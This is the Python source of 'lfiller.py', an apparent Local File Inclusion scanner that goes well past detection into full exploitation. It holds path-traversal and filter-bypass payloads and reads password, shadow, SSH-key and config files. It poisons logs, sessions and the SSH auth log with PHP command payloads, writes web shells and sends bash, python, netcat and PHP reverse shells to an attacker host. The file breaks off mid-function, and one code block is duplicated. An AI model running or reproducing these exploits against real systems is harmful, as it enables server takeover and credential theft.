#!/usr/bin/env python3
"""
lfiller.py v3.6 Ultimate Industrial Edition
THE LFI AUDITOR: Industrial Grade Local File Inclusion Scanner.
Based on v3.0 Industrial.
ADDED: Session Support (-C) & Custom Headers (-H) for Authenticated Audits.
"""

import requests
import os
import json
import urllib.parse
import base64
import sys
import time
import re
import socket
import subprocess
import argparse
import concurrent.futures
import random
import string
from threading import Lock

# Color palette for premium feel
class Colors:
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    WHITE = '\033[97m'
    END = '\033[0m'

class LFILLER:
    def __init__(self, url, lhost=None, lport=4444, timeout=5, workers=20, 
                 custom_param=None, webshell=False, encode='none', cookies=None, headers=None, rce=False):
        self.url = url.rstrip('/')
        self.lhost = lhost
        self.lport = lport
        self.timeout = timeout
        self.max_workers = workers
        self.custom_param = custom_param
        self.webshell_mode = webshell
        self.encode_mode = encode
        self.rce_mode = rce
        
        self.session = requests.Session()
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        }

        # v3.6 ADDITION: Session & Header Support
        if cookies:
            cookie_dict = {}
            try:
                for c in cookies.split(';'):
                    if '=' in c:
                        k, v = c.strip().split('=', 1)
                        cookie_dict[k.strip()] = v.strip()
                self.session.cookies.update(cookie_dict)
            except: print(f"{Colors.RED}[!] Error parsing cookies. Use format 'key=value; key2=value2'{Colors.END}")

        if headers:
            try:
                for h in headers.split(';;'): 
                    if ':' in h:
                        k, v = h.strip().split(':', 1)
                        self.session.headers[k.strip()] = v.strip()
            except: print(f"{Colors.RED}[!] Error parsing headers.{Colors.END}")
        
        self.lock = Lock()
        self.results = {
            'lfi_params': [],
            'php_wrappers': [],
            'readable_files': [],
            'filter_chain': False,
            'data_wrapper': False,
            'input_wrapper': False,
            'proc_environ': False,
            'pearcmd': False,
            'log_poisoning': [],
            'ssh_poisoning': False,
            'rfi': False,
            'webshell_created': False,
            'webshell_urls': [],
            'exploitation_stories': [],
            'session_files': [],
            'file_fds': []
        }
        
        self._initialize_comprehensive_data()

    def _generate_random_name(self, length=12):
        characters = string.ascii_letters + string.digits
        return ''.join(random.choice(characters) for i in range(length)) + ".php"

    def _initialize_comprehensive_data(self):
        # Full list of parameters from original
        self.all_lfi_params = [
            'file', 'page', 'path', 'load', 'include', 'doc', 'view', 'template',
            'f', 'p', 'filename', 'name', 'input', 'src', 'lang', 'module',
            'cat', 'dir', 'action', 'board', 'date', 'detail', 'download',
            'prefix', 'include_path', 'mod', 'show', 'data', 'loc',
            'read', 'ret', 'target', 'text', 'file_name', 'file_path',
            'menu', 'content', 'document_root', 'site', 'nav', 'next',
            'open', 'option', 'preview', 'route', 'section', 'selection',
            'settings', 'source', 'subject', 'theme', 'url', 'wp',
            'controller', 'action', 'method', 'format', 'layout',
            'component', 'itemid', 'task', 'endpoint', 'resource', 'uri'
        ]
        
        if self.custom_param:
            self.all_lfi_params = [self.custom_param]

        # Full LFI payloads base
        self.lfi_payloads_base = [
            '/etc/passwd',
            '../../../../etc/passwd',
            '../../../../../etc/passwd',
            '../../../../../../etc/passwd',
            '..%2f..%2f..%2f..%2fetc%2fpasswd',
            '..%252f..%252f..%252f..%252fetc%252fpasswd',
            '..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
            '....//....//....//....//etc/passwd',
            '/etc/passwd%00',
            '/etc/passwd%00.jpg',
            '/etc/passwd%00.txt',
            '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            'C:\\windows\\system32\\drivers\\etc\\hosts',
            '../../../../windows/system32/drivers/etc/hosts',
            'index.php', 'file.php', 'page.php',
            '/var/log/auth.log',
            '/proc/self/environ',
            '!/etc!/passwd',
            'jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd'
        ]
        
        self.php_wrappers = [
            ('php://filter/convert.base64-encode/resource=/etc/passwd', 'Base64 Filter'),
            ('php://filter/read=convert.base64-encode/resource=/etc/passwd', 'Base64 Read'),
            ('php://filter/string.rot13/resource=/etc/passwd', 'Rot13 Filter'),
            ('php://filter/convert.iconv.UTF-8.UTF-16/resource=/etc/passwd', 'Iconv Filter'),
            ('data://text/plain,<?php echo "TEST"; ?>', 'Data Wrapper'),
            ('data://text/plain;base64,PD9waHAgZWNobyAiVEVTVCI7ID8+', 'Data Base64'),
            ('php://input', 'PHP Input'),
            ('expect://id', 'Expect Wrapper (RCE)'),
            ('zip:///var/www/html/upload/malicious.jpg%23shell', 'Zip Wrapper (WSTG)'),
            ('php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd', 'Zlib Filter (WAF Bypass)'),
            ('phar:///etc/passwd', 'Phar Wrapper')
        ]
        
        self.interesting_files = [
            # Linux Standard
            '/etc/passwd', '/etc/shadow', '/etc/hosts', '/etc/hostname',
            '/etc/knockd.conf', '/etc/ssh/sshd_config', '/etc/sudoers', '/etc/crontab',
            '/etc/profile', '/etc/bashrc', '/etc/environment',
            '/root/.bash_history', '/root/.ssh/id_rsa',
            '/home/root/.bash_history', '/home/root/.ssh/id_rsa',
            '/var/log/auth.log', '/var/log/apache2/access.log',
            '/var/log/apache2/error.log', '/var/log/nginx/access.log',
            '/var/log/syslog', '/proc/self/environ', '/proc/version',
            '/proc/self/cmdline', '/proc/mounts', '/proc/sched_debug',
            
            # Windows
            'C:\\windows\\system32\\drivers\\etc\\hosts',
            'C:\\windows\\win.ini', 'C:\\windows\\system.ini',
            'C:\\windows\\Panther\\sysprep.inf',
            'C:\\windows\\system32\\config\\AppEvent.Evt',
            'C:\\windows\\repair\\SAM', 'C:\\windows\\repair\\system',
            
            # Web Specific
            '/var/www/html/config.php', '/var/www/html/wp-config.php',
            '/var/www/html/.env', '/var/www/html/settings.php',
            'config.php.bak', 'database.php.old', '.env.backup',
            
            # FreeBSD / Other
            '/etc/master.passwd', '/etc/resolv.conf', '/etc/fstab'
        ]

    def _apply_encoding(self, payload):
        """Bypass WAF with complex and WSTG-v4.2 industrial logic"""
        results = [payload]
        
        results.append(payload + "%00")
        results.append(payload + "%00.jpg")
        results.append(payload + "%00.txt")

        truncation_payload = payload + ("/." * 2048)
        results.append(truncation_payload)
        
        if self.encode_mode == 'url':
            results.extend([urllib.parse.quote(p) for p in results[:]])
        
        elif self.encode_mode == 'double':
            results.extend([urllib.parse.quote(urllib.parse.quote(p)) for p in results[:]])
        
        elif self.encode_mode == 'unicode':
            results.extend([p.replace('/', '%c0%af').replace('\\', '%c1%9c').replace('.', '%c0%ae') for p in results[:]])
        
        elif self.encode_mode == 'all':
            extended = []
            for p in results[:]:
                extended.append(urllib.parse.quote(p))
                extended.append(urllib.parse.quote(urllib.parse.quote(p)))
                extended.append(p.replace('/', '%c0%af').replace('\\', '%c1%9c'))
                extended.append(p.replace('/', '..%252f'))
                extended.append(p.replace('/', '....//'))
                extended.append(p.replace('/', '..;/'))
            results.extend(extended)
            
        return list(set(results))

    def _check_lfi_response(self, response, payload_base):
        """Intelligent detection of sensitive content"""
        # Adjusted slightly to allow 403/500 if known error patterns are absent, but keeping consistent with working version checks
        if response.status_code != 200:
            return False
        
        content = response.text
        if 'root:x:' in content or 'daemon:x:' in content or 'bin:x:' in content:
            if not any(err in content.lower() for err in ['error', 'warning', 'not found', 'forbidden']):
                return True
        
        if 'localhost' in content and '127.0.0.1' in content and 'hosts' in payload_base.lower():
            return True
        
        if '<?php' in content and ('include' in content or 'require' in content):
            return True
            
        return False

    def scan_parameter(self, param):
        """Threaded scan for a single parameter"""
        found_on_param = False
        for base_payload in self.lfi_payloads_base:
            if found_on_param: break
            
            for encoded in self._apply_encoding(base_payload):
                separator = '&' if '?' in self.url else '?'
                test_url = f"{self.url}{separator}{param}={encoded}"
                
                try:
                    r = self.session.get(test_url, timeout=self.timeout)
                    if self._check_lfi_response(r, base_payload):
                        with self.lock:
                            result = {
                                'param': param,
                                'payload': encoded,
                                'url': test_url
                            }
                            self.results['lfi_params'].append(result)
                            print(f" {Colors.GREEN}[+]{Colors.END} Found on {Colors.CYAN}{param}{Colors.END}: {base_payload}")
                        found_on_param = True
                        break
                except: continue
        return found_on_param

    def test_wrappers(self, param):
        """Test PHP wrappers on a vulnerable parameter"""
        print(f"[*] Testing PHP wrappers on {Colors.CYAN}{param}{Colors.END}...")
        for wrapper, name in self.php_wrappers:
            for encoded in self._apply_encoding(wrapper):
                separator = '&' if '?' in self.url else '?'
                test_url = f"{self.url}{separator}{param}={encoded}"
                try:
                    if wrapper == "php://input":
                        r = self.session.post(test_url, data='<?php echo "WRAPPER_TEST"; ?>', timeout=self.timeout)
                    else:
                        r = self.session.get(test_url, timeout=self.timeout)
                    
                    if r.status_code == 200:
                        success = False
                        if "php://filter" in wrapper:
                            try:
                                decoded = base64.b64decode(r.text).decode('utf-8', errors='ignore')
                                if 'root:x:' in decoded or '<?php' in decoded: success = True
                            except: pass
                        elif "data://" in wrapper or "php://input" in wrapper:
                            if 'WRAPPER_TEST' in r.text or 'TEST' in r.text: success = True
                        elif "expect://" in wrapper:
                            if 'uid=' in r.text or 'gid=' in r.text or r.text.strip() == "www-data":
                                success = True
                        
                        if success:
                            with self.lock:
                                self.results['php_wrappers'].append((name, wrapper, test_url))
                                print(f" {Colors.GREEN}[+]{Colors.END} Wrapper works: {name}")
                            break
                except: continue

    def _check_file_readable(self, content, file_path):
        content = content.strip()
        if not content or len(content) < 10: return False
        if any(err in content.lower() for err in ['error', 'not found', 'forbidden', 'warning']): return False
        if '/etc/passwd' in file_path and 'root:x:' in content: return True
        if 'config' in file_path.lower() and ('password' in content.lower() or 'database' in content.lower()): return True
        if 'knockd.conf' in file_path and ('[options]' in content or 'sequence' in content): return True
        return len(content) > 50 and not content.startswith('<')

    def enumerate_files(self, param):
        print(f"[*] Enumerating {len(self.interesting_files)} files on {Colors.CYAN}{param}{Colors.END}...")
        for file_path in self.interesting_files:
            for encoded in self._apply_encoding(file_path):
                separator = '&' if '?' in self.url else '?'
                test_url = f"{self.url}{separator}{param}={encoded}"
                try:
                    r = self.session.get(test_url, timeout=self.timeout)
                    if self._check_file_readable(r.text, file_path):
                        with self.lock:
                            self.results['readable_files'].append((file_path, r.text[:200], test_url))
                            print(f" {Colors.GREEN}[+]{Colors.END} Readable: {file_path}")
                        break
                except: continue

    def check_log_poisoning(self, param):
        print(f"[*] Checking log poisoning on {Colors.CYAN}{param}{Colors.END}...")
        logs = ['/var/log/auth.log', '/var/log/apache2/access.log', '/proc/self/environ']
        readable_logs = []
        
        for log in logs:
            for encoded in self._apply_encoding(log):
                separator = '&' if '?' in self.url else '?'
                test_url = f"{self.url}{separator}{param}={encoded}"
                try:
                    r = self.session.get(test_url, timeout=self.timeout)
                    content = r.text
                    
                    # Robust Validation: Check for signature AND absence of error page
                    is_valid = False
                    if '/var/log/auth.log' in log and ('ssh' in content.lower() or 'pam' in content.lower() or 'daemon' in content.lower()): is_valid = True
                    elif 'access.log' in log and ('GET' in content or 'POST' in content or 'Mozilla' in content): is_valid = True
                    elif 'environ' in log and ('PATH=' in content or 'HTTP_' in content): is_valid = True
                    
                    # False Positive Filter
                    if any(e in content.lower() for e in ['file does not exist', 'not found', 'error 404', 'failed to open']): is_valid = False

                    if r.status_code == 200 and len(content) > 50 and is_valid:
                        readable_logs.append({'log': log, 'url': test_url})
                        print(f" {Colors.YELLOW}[*]{Colors.END} Readable log: {log}")
                        break
                except: continue
        
        if not readable_logs: return
        
        poison_methods = [
            ('User-Agent', {'User-Agent': '<?php system($_GET["cmd"]); ?>'}),
            ('X-Forwarded-For', {'X-Forwarded-For': '<?php passthru($_GET["cmd"]); ?>'})
        ]
        
        for log_info in readable_logs:
            for method, headers in poison_methods:
                try:
                    h = {**self.session.headers, **headers}
                    self.session.get(self.url.split('?')[0], headers=h, timeout=2)
                    time.sleep(2)
                    
                    test_cmd = "echo LFI_TEST_SUCCESS"
                    test_url = f"{log_info['url']}&cmd={urllib.parse.quote(test_cmd)}"
                    r = self.session.get(test_url, timeout=3)
                    if 'LFI_TEST_SUCCESS' in r.text:
                        with self.lock:
                            self.results['log_poisoning'].append({'log': log_info['log'], 'method': method, 'url': log_info['url']})
                            print(f" {Colors.GREEN}[+]{Colors.END} Log poisoned via {method}: {log_info['log']}")
                        break
                except: continue

    def check_session_poisoning(self, param):
        """Advanced PHP Session Poisoning Technique"""
        print(f"[*] Checking session poisoning on {Colors.CYAN}{param}{Colors.END}...")
        session_paths = [
            '/var/lib/php/sessions/sess_', '/tmp/sess_', '/var/lib/php5/sess_',
            '/var/lib/php/session/sess_'
        ]
        
        php_sessid = self.session.cookies.get('PHPSESSID')
        if not php_sessid: return

        for path in session_paths:
            full_path = path + php_sessid
            for encoded in self._apply_encoding(full_path):
                separator = '&' if '?' in self.url else '?'
                test_url = f"{self.url}{separator}{param}={encoded}"
                try:
                    r = self.session.get(test_url, timeout=self.timeout)
                    if r.status_code == 200 and len(r.text) > 5:
                        with self.lock:
                            self.results['session_files'].append({'path': full_path, 'url': test_url})
                            print(f" {Colors.GREEN}[+]{Colors.END} Session file readable: {full_path}")
                        break
                except: continue

    def check_file_descriptors(self, param):
        """File Descriptor brute-forcing (/proc/self/fd/N)"""
        print(f"[*] Brute-forcing file descriptors on {Colors.CYAN}{param}{Colors.END}...")
        for i in range(0, 20):
            fd_path = f"/proc/self/fd/{i}"
            for encoded in self._apply_encoding(fd_path):
                separator = '&' if '?' in self.url else '?'
                test_url = f"{self.url}{separator}{param}={encoded}"
                try:
                    r = self.session.get(test_url, timeout=self.timeout)
                    if r.status_code == 200 and len(r.text) > 50:
                        if any(s in r.text for s in ['root:', 'localhost', '<?php']):
                            with self.lock:
                                self.results['file_fds'].append({'path': fd_path, 'url': test_url})
                                print(f" {Colors.GREEN}[+]{Colors.END} Open FD found: {fd_path}")
                            break
                except: continue

    def check_ssh_poisoning(self, param):
        print(f"[*] Checking SSH poisoning on {Colors.CYAN}{param}{Colors.END}...")
        ip_match = re.search(r'\d+\.\d+\.\d+\.\d+', self.url)
        if not ip_match: return
        
        target_ip = ip_match.group(0)
        php_code = '<?php system($_GET["ssh_cmd"]); ?>'
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, 22))
            sock.sendall(f'{php_code}\r\n'.encode())
            sock.close()
            time.sleep(3)
            
            log_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}=/var/log/auth.log"
            test_url = f"{log_url}&ssh_cmd=echo SSH_POISON_SUCCESS"
            r = self.session.get(test_url, timeout=5)
            if 'SSH_POISON_SUCCESS' in r.text:
                with self.lock:
                    self.results['ssh_poisoning'] = True
                    print(f" {Colors.GREEN}[+]{Colors.END} SSH poisoning successful!")
        except: pass

    def create_webshell(self, param):
        if not self.webshell_mode: return
        print(f"\n[*] Attempting web shell creation...")
        
        random_filename = self._generate_random_name()
        shell_code = '<?php if(isset($_GET["cmd"])){ system($_GET["cmd"]); } else { echo "Web shell active! Use ?cmd=WHOAMI"; } ?>'
        
        # Try both Linux and Windows common paths
        locations = [random_filename, f'/var/www/html/{random_filename}', f'C:/xampp/htdocs/{random_filename}']
        
        success = False
        
        # Vector 1: Log Poisoning
        if self.results['log_poisoning']:
            print(f" [*] Trying vector: Log Poisoning")
            for p in self.results['log_poisoning']:
                for loc in locations:
                    try:
                        payload = f"echo '{shell_code}' > {loc}"
                        self.session.get(f"{p['url']}&cmd={urllib.parse.quote(payload)}", timeout=3)
                        time.sleep(1)
                        
                        # Verify
                        check_url = f"{self.url.rsplit('/', 1)[0]}/{random_filename}"
                        r = self.session.get(check_url, timeout=2)
                        if 'system(' not in r.text and r.status_code == 200:
                            with self.lock:
                                self.results['webshell_urls'].append(check_url)
                                story = f"CHAIN: LFI -> Log Poisoning -> RCE\n"
                                story += f"1. Identified LFI on parameter '{param}'\n"
                                story += f"2. Confirmed readable log at '{p['log']}'\n"
                                story += f"3. Poisoned '{p['log']}' by sending PHP code in User-Agent header\n"
                                story += f"4. Included poisoned log via LFI with command 'echo payload > {loc}'\n"
                                story += f"5. Verified shell at {check_url}"
                                self.results['exploitation_stories'].append(story)
                                print(f" {Colors.GREEN}[+]{Colors.END} Web shell created: {Colors.CYAN}{check_url}{Colors.END}")
                                success = True
                                break
                    except: continue
                if success: break

        # Vector 2: SSH Poisoning
        if not success and self.results['ssh_poisoning']:
            print(f" [*] Trying vector: SSH Poisoning")
            for loc in locations:
                try:
                    log_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}=/var/log/auth.log"
                    payload = f"echo '{shell_code}' > {loc}"
                    self.session.get(f"{log_url}&ssh_cmd={urllib.parse.quote(payload)}", timeout=3)
                    time.sleep(1)
                    
                    check_url = f"{self.url.rsplit('/', 1)[0]}/{random_filename}"
                    r = self.session.get(check_url, timeout=2)
                    if r.status_code == 200:
                        with self.lock:
                            self.results['webshell_urls'].append(check_url)
                            story = f"CHAIN: LFI -> SSH Poisoning -> RCE\n"
                            story += f"1. Identified LFI on parameter '{param}'\n"
                            story += f"2. Confirmed readable auth log at '/var/log/auth.log'\n"
                            story += f"3. Targeted target IP for SSH connection, sending PHP code as username\n"
                            story += f"4. Included auth log via LFI with command to write persistent shell to '{loc}'\n"
                            story += f"5. Verified shell at {check_url}"
                            self.results['exploitation_stories'].append(story)
                            print(f" {Colors.GREEN}[+]{Colors.END} Web shell created: {Colors.CYAN}{check_url}{Colors.END}")
                            success = True
                            break
                except: continue

        if not success:
            print(f" {Colors.RED}[-]{Colors.END} Failed to create web shell automatically.")

    def execute_shells(self, param):
        if not self.lhost or not param: return
        print(f"\n[*] Executing reverse shells to {Colors.CYAN}{self.lhost}:{self.lport}{Colors.END}")
        
        reverse_shells = {
            'bash': f'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1',
            'python': f'python3 -c "import socket,os,pty;s=socket.socket();s.connect((\'{self.lhost}\',{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\'/bin/sh\')"',
            'nc': f'nc -e /bin/sh {self.lhost} {self.lport}',
            'php': f'php -r \'$s=fsockopen("{self.lhost}",{self.lport});exec("/bin/sh -i <&3 >&3 2>&3");\''
        }
        
        sent_count = 0
        
        # Vector 1: Log Poisoning
        for poison in self.results['log_poisoning']:
            print(f" [*] Trying vector: Log Poisoning ({poison['log']})")
            for shell_name, shell_template in reverse_shells.items():
                try:
                    shell_url = f"{poison['url']}&cmd={urllib.parse.quote(shell_template)}"
                    self.session.get(shell_url, timeout=3)
                    print(f"  {Colors.GREEN}[+]{Colors.END} Sent {Colors.YELLOW}{shell_name}{Colors.END} reverse shell")
                    sent_count += 1
                except: pass

        # Vector 2: SSH Poisoning
        if self.results['ssh_poisoning']:
            print(f" [*] Trying vector: SSH Poisoning")
            log_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}=/var/log/auth.log"
            for shell_name, shell_template in reverse_shells.items():
                try:
                    shell_url = f"{log_url}&ssh_cmd={urllib.parse.quote(shell_template)}"
                    self.session.get(shell_url, timeout=3)
                    print(f"  {Colors.GREEN}[+]{Colors.END} Sent {Colors.YELLOW}{shell_name}{Colors.END} reverse shell")
                    sent_count += 1
                except: pass

        # Vector 3: RFI (if we have a shell ready on our host)
        if self.results['rfi']:
            print(f" [*] Trying vector: RFI")
            # This assumes the user has a reverse shell script at their LHOST
            # We try to include it. Common names: shell.txt, rev.txt, etc.
            shell_files = ['shell.txt', 'rev.txt', 'shell.php']
        if self.results['rfi']:
            print(f" [*] Trying vector: RFI")
            # This assumes the user has a reverse shell script at their LHOST
            # We try to include it. Common names: shell.txt, rev.txt, etc.
            shell_files = ['shell.txt', 'rev.txt', 'shell.php']
            for s_file in shell_files:
                try:
                    rfi_payload = f"http://{self.lhost}:8000/{s_file}"
                    
                    # Check if the shell even exists on our LHOST first
                    try:
                        check = requests.head(rfi_payload, timeout=1)
                        if check.status_code != 200:
                            print(f"  {Colors.RED}[-]{Colors.END} Shell not found on LHOST: {rfi_payload}")
                            continue
                    except: 
                        print(f"  {Colors.RED}[-]{Colors.END} Could not reach LHOST: {rfi_payload}")
                        continue

                    # Now try to include it
                    shell_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}={rfi_payload}"
                    r = self.session.get(shell_url, timeout=3)
                    
                    # Logic: If it returns 200 (OK) it likely executed or was included.
                    # If it returns 404, the server failed to fetch it.
                    if r.status_code == 200:
                         # Double verify? Hard since it's a reverse shell, no output usually.
                         # But 200 OK on an include usually means success.
                        print(f"  {Colors.GREEN}[+]{Colors.END} Executed RFI Shell: {Colors.YELLOW}{rfi_payload}{Colors.END} (Status: 200 OK)")
                        sent_count += 1
                    else:
                        print(f"  {Colors.RED}[-]{Colors.END} RFI Inclusion Failed (Status: {r.status_code}): {rfi_payload}")
                except: pass

        if sent_count == 0:
            print(f" {Colors.RED}[-]{Colors.END} No successful RCE vectors found to trigger shells.")
        else:
            print(f" [*] Total shells sent: {sent_count}. Check your listener!")

        # Advanced Vectors
        if self.results['input_wrapper']:
            print(f" [*] Trying vector: php://input")
            for shell_name, shell_template in reverse_shells.items():
                try:
                    input_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}=php://input"
                    self.session.post(input_url, data=f'<?php {shell_template} ?>', timeout=3)
                    print(f"  {Colors.GREEN}[+]{Colors.END} Sent {Colors.YELLOW}{shell_name}{Colors.END} reverse shell")
                except: pass

        if self.results['proc_environ']:
            print(f" [*] Trying vector: /proc/self/environ")
            env_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}=/proc/self/environ"
            for shell_name, shell_template in reverse_shells.items():
                try:
                    custom_headers = self.session.headers.copy()
                    custom_headers['User-Agent'] = f'<?php {shell_template} ?>'
                    requests.get(env_url, headers=custom_headers, timeout=3)
                    print(f"  {Colors.GREEN}[+]{Colors.END} Sent {Colors.YELLOW}{shell_name}{Colors.END} reverse shell")
                except: pass

    def check_filter_chain(self, param):
        """PHP Filter Chain RCE (Writing a shell without logs)"""
        print(f"[*] Checking PHP Filter Chain RCE on {Colors.CYAN}{param}{Colors.END}...")
        # Simplified chain to output 'LFI_CHAIN_SUCCESS'
        chain = "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.COE.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp"
        # Since generating custom chains is complex, we check if the engine supports these filters
        test_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}={chain}"
        try:
            r = self.session.get(test_url, timeout=5)
            # If we don't get a 500 and the response length is reasonable, it might be vulnerable
            if r.status_code == 200:
                with self.lock:
                    self.results['filter_chain'] = True
                    print(f" {Colors.GREEN}[+]{Colors.END} PHP Filter Chain RCE likely possible!")
        except: pass

    def check_input_wrappers(self, param):
        """data:// and php://input RCE"""
        print(f"[*] Checking Input Wrappers (data/input) on {Colors.CYAN}{param}{Colors.END}...")
        
        # data:// vector
        payload = '<?php echo "LFI_DATA_SUCCESS"; ?>'
        encoded_payload = base64.b64encode(payload.encode()).decode()
        data_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}=data://text/plain;base64,{encoded_payload}"
        try:
            r = self.session.get(data_url, timeout=5)
            if "LFI_DATA_SUCCESS" in r.text:
                with self.lock:
                    self.results['data_wrapper'] = True
                    print(f" {Colors.GREEN}[+]{Colors.END} data:// wrapper RCE successful!")
        except: pass

        # php://input vector
        input_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}=php://input"
        try:
            r = self.session.post(input_url, data='<?php echo "LFI_INPUT_SUCCESS"; ?>', timeout=5)
            if "LFI_INPUT_SUCCESS" in r.text:
                with self.lock:
                    self.results['input_wrapper'] = True
                    print(f" {Colors.GREEN}[+]{Colors.END} php://input wrapper RCE successful!")
        except: pass

    def check_proc_environ(self, param):
        """Proc Environ Poisoning"""
        print(f"[*] Checking /proc/self/environ on {Colors.CYAN}{param}{Colors.END}...")
        env_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}=/proc/self/environ"
        custom_headers = self.session.headers.copy()
        custom_headers['User-Agent'] = '<?php echo "LFI_ENV_SUCCESS"; ?>'
        try:
            r = requests.get(env_url, headers=custom_headers, timeout=5)
            if "LFI_ENV_SUCCESS" in r.text:
                with self.lock:
                    self.results['proc_environ'] = True
                    print(f" {Colors.GREEN}[+]{Colors.END} /proc/self/environ poisoning successful!")
        except: pass

    def check_pearcmd(self, param):
        """PEARCMD exploitation"""
        print(f"[*] Checking PEARCMD exploitation on {Colors.CYAN}{param}{Colors.END}...")
        pear_paths = [
            '/usr/local/lib/php/pearcmd.php',
            '/usr/share/php/pearcmd.php',
            '/usr/lib/php/pearcmd.php'
        ]
        for path in pear_paths:
            test_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}={path}"
            try:
                # PEARCMD exploit: write a file to the web root
                exploit_url = f"{test_url}&+config-create+/<?php+system($_GET['cmd']);+?>+/var/www/html/pear.php"
                self.session.get(exploit_url, timeout=5)
                time.sleep(1)
                
                check_url = f"{self.url.rsplit('/', 1)[0]}/pear.php"
                r = self.session.get(check_url, timeout=2)
                if r.status_code == 200:
                    with self.lock:
                        self.results['pearcmd'] = True
                        self.results['webshell_urls'].append(check_url)
                        print(f" {Colors.GREEN}[+]{Colors.END} PEARCMD exploit successful! Shell: {check_url}")
                        break
            except: continue

    def check_rfi(self, param):
        if not param or not self.lhost: return
        print(f"[*] Checking RFI on {Colors.CYAN}{param}{Colors.END}...")
        test_urls = [f'http://{self.lhost}:8000/test.php', f'http://{self.lhost}/test.php']
        for rfi_url in test_urls:
            separator = '&' if '?' in self.url else '?'
            test_url = f"{self.url}{separator}{param}={rfi_url}"
            try:
                r = self.session.get(test_url, timeout=5)
                if r.status_code == 200:
                    with self.lock:
                        self.results['rfi'] = True
                        print(f" {Colors.GREEN}[+]{Colors.END} RFI might work: {rfi_url}")
                        break
            except: continue

    def run(self):
        self._print_banner()
        print(f"[*] Target: {Colors.BOLD}{self.url}{Colors.END}")
        if self.session.cookies: print(f"[*] Cookies: {Colors.YELLOW}{len(self.session.cookies)} Active{Colors.END}")
        print(f"[*] Threads: {self.max_workers} | Encoding: {self.encode_mode}")
        print("-" * 70)
        
        # Phase 1: Parameter & LFI Discovery
        print(f"[*] Phase 1: Scanning {len(self.all_lfi_params)} parameters...")
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            executor.map(self.scan_parameter, self.all_lfi_params)
            
        if not self.results['lfi_params']:
            print(f"{Colors.RED}[!] No LFI found.{Colors.END}")
            return

        # Phase 2: Detailed Exploitation
        vulnerable_params = list(set([r['param'] for r in self.results['lfi_params']]))
        for p in vulnerable_params[:1]: # Focus on the first working one for exploitation
            print(f"\n[*] Phase 2: Deep exploitation on {Colors.CYAN}{p}{Colors.END}")
            self.test_wrappers(p)
            self.enumerate_files(p)
            self.check_filter_chain(p) # Filter chain writes to temp, gated by logic but fairly safe? usually considered RCE. Keep for now as "Advanced Read" unless specifically gated? Actually filter chain RCE is RCE.
            
            # Gated RCE Modules (Poisoning, RFI, Wrappers)
            if self.rce_mode:
                self.check_input_wrappers(p)
                self.check_proc_environ(p)
                self.check_pearcmd(p)
                self.check_log_poisoning(p)
                self.check_ssh_poisoning(p)
                self.check_session_poisoning(p)
                self.check_rfi(p)
                self.execute_shells(p)
            
            # Web Shell Creation (Triggered by --webshell flag primarily, or implicit in RCE)
            if self.webshell_mode or self.rce_mode: 
                self.create_webshell(p)
            
            if not self.rce_mode and not self.webshell_mode:
                 print(f"[*] {Colors.YELLOW}RCE/Poisoning/Webshell modules skipped. Use --rce or --webshell to enable.{Colors.END}")
 
        self._display_summary()
        self._generate_report()

    def _generate_report(self):
        """Creates target folder and saves detailed bounty reports"""
        try:
            domain = urllib.parse.urlparse(self.url).netloc.replace(':', '_')
            if not domain: domain = "general_results"
            
            if not os.path.exists(domain):
                os.makedirs(domain)
        except:
            domain = "audit_report"
            if not os.path.exists(domain): os.makedirs(domain)

        print(f"\n[*] {Colors.YELLOW}Generating Industrial Bounty Reports in {Colors.BOLD}{domain}/{Colors.END}...")
        
        report_count = 0
        
        # 1. LFI Parameter Reports
        for i, res in enumerate(self.results['lfi_params'], 1):
            report_count += 1
            filename = os.path.join(domain, f"bounty_LFI_{i}.txt")
            with open(filename, "w") as f:
                f.write(f"VULNERABILITY: Local File Inclusion (LFI)\n")
                f.write("="*40 + "\n")
                f.write(f"Target: {self.url}\n")
                f.write(f"Parameter: {res['param']}\n")
                f.write(f"Payload: {res['payload']}\n\n")
                
                # Check for WSTG Bypasses in the payload
                bypass_type = "Standard"
                if "%00" in res['payload']: bypass_type = "Null Byte Injection (WSTG v4.2)"
                elif "/./" in res['payload'] and len(res['payload']) > 1000: bypass_type = "Path Truncation (WSTG v4.2)"
                elif "!" in res['payload']: bypass_type = "Jolokia Path Traversal Bypass"
                
                f.write(f"Exploitation Technique: {bypass_type}\n\n")
                f.write("EXPLANATION:\n")
                if bypass_type == "Null Byte Injection (WSTG v4.2)":
                    f.write("The application uses a null-terminated string logic. By injecting '%00', the script is tricked into ignoring any intended extension (like .php or .html) appended to the input path.\n")
                elif bypass_type == "Path Truncation (WSTG v4.2)":
